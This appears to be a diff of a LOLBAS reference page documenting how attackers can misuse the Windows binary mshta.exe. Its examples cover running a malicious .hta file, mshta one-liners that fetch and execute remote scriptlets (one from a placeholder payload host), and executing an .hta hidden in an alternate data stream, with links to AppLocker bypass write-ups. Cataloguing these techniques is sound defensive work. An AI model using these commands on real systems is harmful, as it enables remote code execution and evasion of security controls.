@@ -31,8 +31,43 @@
 </h1>
 
 
+<ul class="function-list">
+    
+    
+    <li><a href="/lolbas/Binaries/Mshta/#execute">Execute</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Mshta/#ads">Alternate data streams</a></li>
+    
+</ul>
 
 
+
+<br>
+<p><b>Paths:</b> 
+	<ul style="list-style-type:none">
+	
+	<li>c:\windows\system32\mshta.exe</li>
+	
+	<li>c:\windows\sysWOW64\mshta.exe</li>
+	 
+	</ul>
+</p>
+<br>
+<b>Resources:</b> 	
+	<ul style="list-style-type:none">
+	
+	<li><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4</a></li>
+	
+	<li><a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a></li>
+	
+	<li><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/">https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</a></li>
+	 
+	</ul>
+<br>
+<b>Contributors:</b> <p>Thanks to Casey Smith - @subtee, Oddvar Moe - @oddvarmoe</p>
+
+<br>
 
 
 
@@ -46,34 +81,67 @@
 
 <ul class="examples">
 
-	
-    <li>
-        <h3>Name</h3>
-		<pre><code>mshta.exe</code></pre>
-        <h3>Commands</h3>
-        <pre><code>Command: mshta.exe evilfile.hta
-Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
-Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
-Description: Executes VBScript supplied as a command line argument.
-Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
-Description: Executes JavaScript supplied as a command line argument.
-Command: mshta.exe "C:\ads\file.txt:file.hta"
-Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.</code></pre>
-        <h3>Full Path</h3>
-        <pre><code>C:\Windows\System32\mshta.exe C:\Windows\SysWOW64\mshta.exe</code></pre>
-        <h3>Code Sample</h3>
-        <pre><code></code></pre>
-        <h3>Resources</h3>
-		<pre><code>https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Mshta.md
-https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
-https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
-https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</code></pre>
-        <h3>Notes</h3>
-        <pre><code>Thanks to Casey Smith - @subtee, Oddvar Moe - @oddvarmoe</code></pre>
-    </li>
     
+
+
+
+    <li>
+        <p>Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.</p>
+
+        <pre><code>mshta.exe evilfile.hta</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Executes VBScript supplied as a command line argument.</p>
+
+        <pre><code>mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Executes JavaScript supplied as a command line argument.</p>
+
+        <pre><code>mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();</code></pre>
+    </li>
+
+    
+
 </ul>
+<br>
+
+
+
+
+
+<h2 id="ads" class="function-name">Alternate data streams</h2>
+
+<p>The LOLBAS can write or read alternate data streams.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.</p>
+
+        <pre><code>mshta.exe "C:\ads\file.txt:file.hta"</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
 
 
         <script>
